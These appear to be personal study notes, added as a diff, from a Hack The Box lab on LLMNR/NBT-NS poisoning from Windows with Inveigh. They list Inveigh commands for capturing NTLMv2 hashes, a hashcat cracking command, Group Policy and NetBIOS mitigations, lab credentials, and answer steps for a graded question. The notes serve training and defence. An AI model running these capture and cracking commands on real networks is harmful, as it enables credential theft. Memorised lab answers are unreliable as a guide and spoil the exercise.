@@ -1,1 +1,23 @@
 
+LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool Inveigh and attempt to capture another set of credentials.
+
+So the steps for this would be pretty much the same but in windows form. 
+
+PS SYNTAX: PS C:\htb> Import-Module .\Inveigh.ps1 
+PS SYNTAX: PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y 
+
+
+Mitigation: We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
+
+Mitigation: NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP.
+
+
+Challenge: RDP to 10.129.239.190 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
+Question 1 - Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer. - security#1 
+
+1) RDP in xfreerdp /v:10.129.239.190 /u:htb-student /p:Academy_student_AD! 
+2) PS C:\htb> Import-Module .\Inveigh.ps1 
+3) PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y  
+4) copy and paste hashes back to kali / host machine 
+5) hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
